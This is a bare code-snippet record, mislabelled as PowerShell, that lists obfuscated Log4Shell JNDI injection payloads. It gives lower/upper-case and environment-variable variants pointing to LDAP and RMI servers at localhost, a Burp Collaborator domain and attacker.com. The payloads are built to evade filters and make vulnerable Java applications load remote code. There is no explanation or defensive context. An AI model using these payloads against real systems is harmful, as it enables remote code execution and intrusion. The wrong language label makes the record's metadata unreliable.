---
id: be80f2e7-382a-4df9-81a2-8e50840ac107
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:55:56.544316+00:00'
updated_at: '2023-04-06T03:55:56.547719+00:00'
---

# Code Snippet be80f2e7

**Language**: Powershell

```powershell
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1:1389/a}

# using lower and upper
${${lower:jndi}:${lower:rmi}://127.0.0.1:1389/poc}
${j${loWer:Nd}i${uPper::}://127.0.0.1:1389/poc}
${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce}

# using env to create the letter
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//your.burpcollaborator.net/a}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}
```
